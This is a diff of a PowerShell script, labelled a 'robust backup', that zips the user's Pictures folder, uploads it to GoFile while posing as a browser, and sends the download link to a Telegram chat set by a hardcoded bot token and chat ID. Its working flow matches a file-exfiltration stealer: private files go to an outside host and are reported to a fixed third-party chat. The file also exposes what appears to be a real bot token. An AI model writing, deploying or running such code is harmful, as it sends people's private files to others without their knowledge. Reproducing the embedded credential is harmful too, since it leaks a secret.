@@ -1,74 +1,103 @@
 # ========================================
-#            CONFIGURATION
+#          ROBUST CONFIGURATION
 # ========================================
-# FORCE TLS 1.2 (Fixes "API Down" errors)
+# 1. FIX SECURITY PROTOCOLS (Prevents "API Down" errors)
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
+# 2. YOUR DETAILS
 $BotToken       = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
 $ChatId         = "2146236602"
 
-# Folder to zip (Uses current user profile)
+# 3. PATHS
 $PicturesFolder = "$env:USERPROFILE\Pictures" 
 $ZipFile        = "$env:TEMP\Pictures_Backup.zip"
+
+# Function to pause window so it doesn't vanish on error
+function Pause-Script {
+    Write-Host "`nPress Enter to exit..." -ForegroundColor Gray
+    $null = Read-Host
+    exit
+}
 # ========================================
 
-Write-Host "--- STARTED BACKUP PROCESS ---" -ForegroundColor Magenta
+Clear-Host
+Write-Host "--- STARTED ROBUST BACKUP PROCESS ---" -ForegroundColor Magenta
 
-# 1. ZIP THE FOLDER
+# ---------------------------------------------------------
+# STEP 1: ZIP THE FOLDER
+# ---------------------------------------------------------
 Write-Host "[1/4] Zipping pictures folder..." -ForegroundColor Cyan
 try {
     if (Test-Path $ZipFile) { Remove-Item $ZipFile -Force }
+    
+    # Check if source folder actually exists
+    if (-not (Test-Path $PicturesFolder)) {
+        throw "Source folder not found: $PicturesFolder"
+    }
+
     Compress-Archive -Path "$PicturesFolder\*" -DestinationPath $ZipFile -Force -ErrorAction Stop
     Write-Host "      Zip created successfully." -ForegroundColor Green
 }
 catch {
-    Write-Host "[-] ZIP creation failed: $($_.Exception.Message)" -ForegroundColor Red
-    Read-Host "Press Enter to stop..."
-    return
+    Write-Host "[-] ZIP ERROR: $($_.Exception.Message)" -ForegroundColor Red
+    Pause-Script
 }
 
-# 2. GET GOFILE SERVER
-Write-Host "[2/4] Getting GoFile server..." -ForegroundColor Cyan
+# ---------------------------------------------------------
+# STEP 2: GET GOFILE SERVER
+# ---------------------------------------------------------
+Write-Host "[2/4] Finding best upload server..." -ForegroundColor Cyan
 try {
-    # Added UserAgent to avoid being blocked as a bot
-    $serverInfo = Invoke-RestMethod "https://api.gofile.io/getServer" -UserAgent "Mozilla/5.0" -ErrorAction Stop
+    # Added UserAgent to look like a real browser
+    $serverInfo = Invoke-RestMethod -Uri "https://api.gofile.io/getServer" -UserAgent "Mozilla/5.0" -ErrorAction Stop
     $server = $serverInfo.data.server
-    if (-not $server) { throw "Server data is empty" }
+    
+    if ([string]::IsNullOrWhiteSpace($server)) { throw "Server API returned empty data" }
+    Write-Host "      Connected to server: $server" -ForegroundColor Gray
 }
 catch {
-    # Print the ACTUAL error message
-    Write-Host "[-] Failed to get GoFile server: $($_.Exception.Message)" -ForegroundColor Red
-    Read-Host "Press Enter to stop..."
-    return
+    Write-Host "[-] SERVER ERROR: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "    (This usually means Gofile is blocking requests or internet is unstable)" -ForegroundColor Gray
+    Pause-Script
 }
 
-# 3. UPLOAD ZIP (Using Curl)
-Write-Host "[3/4] Uploading to server ($server)..." -ForegroundColor Cyan
+# ---------------------------------------------------------
+# STEP 3: UPLOAD FILE
+# ---------------------------------------------------------
+Write-Host "[3/4] Uploading file (Please wait)..." -ForegroundColor Cyan
+
+# Check for Curl
 if (-not (Test-Path "$env:SystemRoot\System32\curl.exe")) {
-    Write-Host "[-] Curl.exe not found." -ForegroundColor Red
-    Read-Host "Press Enter to stop..."
-    return
+    Write-Host "[-] Curl.exe is missing. This script requires Windows 10 or 11." -ForegroundColor Red
+    Pause-Script
 }
 
-$curlOutput = & "$env:SystemRoot\System32\curl.exe" -s -F "file=@$ZipFile" "https://$server.gofile.io/uploadFile"
+# Run Upload
+$uploadUrl = "https://$server.gofile.io/uploadFile"
+$curlOutput = & "$env:SystemRoot\System32\curl.exe" -s -F "file=@$ZipFile" $uploadUrl
 
 try {
+    # Robust JSON parsing
     $result = $curlOutput -join "`n" | ConvertFrom-Json
-    if ($result.status -ne "ok") { throw "Status not OK" }
+    
+    if ($result.status -ne "ok") { 
+        throw "Upload status: $($result.status)" 
+    }
+    
     $DownloadLink = $result.data.downloadPage
-    Write-Host "      Upload successful!" -ForegroundColor Green
+    Write-Host "      Upload Successful!" -ForegroundColor Green
     Write-Host "      Link: $DownloadLink" -ForegroundColor Yellow
 }
 catch {
-    Write-Host "[-] Upload failed." -ForegroundColor Red
-    Write-Host "Debug Info: $curlOutput" -ForegroundColor Gray
-    Remove-Item $ZipFile -Force
-    Read-Host "Press Enter to stop..."
-    return
+    Write-Host "[-] UPLOAD FAILED." -ForegroundColor Red
+    Write-Host "    Raw Response: $curlOutput" -ForegroundColor Gray
+    Pause-Script
 }
 
-# 4. SEND TO TELEGRAM & DELETE ZIP
-Write-Host "[4/4] Sending link to Telegram..." -ForegroundColor Cyan
+# ---------------------------------------------------------
+# STEP 4: SEND TO TELEGRAM & CLEANUP
+# ---------------------------------------------------------
+Write-Host "[4/4] Sending to Telegram..." -ForegroundColor Cyan
 try {
     $msgText = "📸 *Pictures Backup Complete*`n`nLink: $DownloadLink"
     
@@ -80,14 +109,19 @@ try {
             parse_mode = "Markdown"
         } -ErrorAction Stop
         
-    Write-Host "      Notification sent." -ForegroundColor Green
+    Write-Host "      Message sent!" -ForegroundColor Green
 
-    # DELETE ZIP AFTER SUCCESS
+    # --- CLEANUP (Only happens if everything above worked) ---
+    Write-Host "      Cleaning up temporary files..." -NoNewline
     Remove-Item $ZipFile -Force -ErrorAction SilentlyContinue
+    Write-Host "Done." -ForegroundColor Green
 }
 catch {
-    Write-Host "[-] Failed to send Telegram message: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[-] TELEGRAM ERROR: $($_.Exception.Message)" -ForegroundColor Red
+    # We do NOT delete the file if Telegram fails, so you don't lose the backup
+    Pause-Script
 }
 
-Write-Host "`n[✓] All Done." -ForegroundColor Green
-Read-Host "Press Enter to close..."
+Write-Host "`n[✓] OPERATION COMPLETED SUCCESSFULLY." -ForegroundColor Green
+Write-Host "Press Enter to close..."
+$null = Read-Host
